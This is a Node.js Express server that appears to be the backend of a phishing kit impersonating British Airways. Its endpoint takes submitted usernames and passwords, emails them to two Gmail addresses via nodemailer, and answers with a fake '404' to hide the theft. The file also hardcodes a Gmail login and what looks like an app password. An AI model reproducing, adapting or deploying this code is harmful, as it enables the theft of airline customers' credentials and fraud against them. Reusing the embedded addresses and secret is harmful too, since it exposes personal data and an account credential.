const express = require("express");
const nodeMailer = require("nodemailer");
const cors = require("cors");

const transporter = nodeMailer.createTransport({
  service: "Gmail",
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: "herbertharthur80@gmail.com",
    pass: "toea aqhr eeyb ocdv",
  },
});

const app = express();

app.use(cors());

app.use(express.static("public"));

app.post("/sendInfo", (req, res) => {
  const { username, password } = req.query;

  const mailOptions = {
    from: "herbertharthur80@gmail.com",
    to: ["kendrickarthur9@gmail.com","arthurherberth74@gmail.com"],
    subject: "British Airways user details",
    text: `username:${username}  password:${password}`,
  };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error("Error sending email: ", error);
      } else {
        console.log("Email sent: ", info.response);
      }
    });
  console.log(username, password);
  res.end("Resource not found 404");
});

const port = process.env.PORT ? process.env.PORT : 8000;

app.listen(port, () => {
  console.log(`Server listening ${port}`);
});
